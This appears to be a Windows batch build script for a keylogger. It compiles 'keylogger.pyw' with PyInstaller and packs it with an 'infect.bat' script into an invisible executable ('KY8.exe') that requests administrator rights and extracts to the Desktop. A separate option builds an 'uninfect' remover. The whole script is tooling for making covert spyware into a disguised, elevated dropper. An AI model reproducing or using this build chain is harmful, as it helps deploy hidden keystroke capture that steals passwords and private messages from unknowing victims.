@echo off
setlocal
set "PYTHON_FILE=keylogger.pyw"
set "OUTPUT_DIR=output"
set EXIT_code=0
if "%1"=="--clean" (
    if exist "%OUTPUT_DIR%" (
        rmdir /s /q "%OUTPUT_DIR%"
    )
    goto :end
) else if "%1"=="--help" (
    echo Usage: build.bat [option]
    echo Options:
    echo   --clean              Clean the output directory.
    echo   --build-uninfect     build the uninfect version of the script.
    echo   --help               Show this help message and exit.
    echo.
    echo If no option is provided, the script will build the Python file.
    goto :end
) else if "%1"=="" (
    if not exist "%OUTPUT_DIR%" (
        mkdir "%OUTPUT_DIR%"
    )
    pyinstaller --onefile --distpath "%OUTPUT_DIR%" --workpath "%OUTPUT_DIR%\build" --specpath "%OUTPUT_DIR%\specs" "%PYTHON_FILE%"
	".\Bat_To_Exe_Converter_(x64).exe" /bat infect.bat /exe KY8.exe /invisible /x64 /workdir [Desktop] /extractdir [Desktop] /overwrite /uac-admin /include %OUTPUT_DIR%\keylogger.exe
    goto :end
) else if "%1"=="--build-uninfect" (
    if not exist "%OUTPUT_DIR%" (
        mkdir "%OUTPUT_DIR%"
    )
    ".\Bat_To_Exe_Converter_(x64).exe" /bat uninfect.bat /exe UKY8.exe /invisible /x64 /uac-admin /workdir [Desktop]
    goto :end
) else (
    echo Error: Invalid option "%1".
    echo Use "build.bat --help" to see available options.
    set EXIT_code=1
    goto :end
)
:end
endlocal
exit /b %EXIT_code%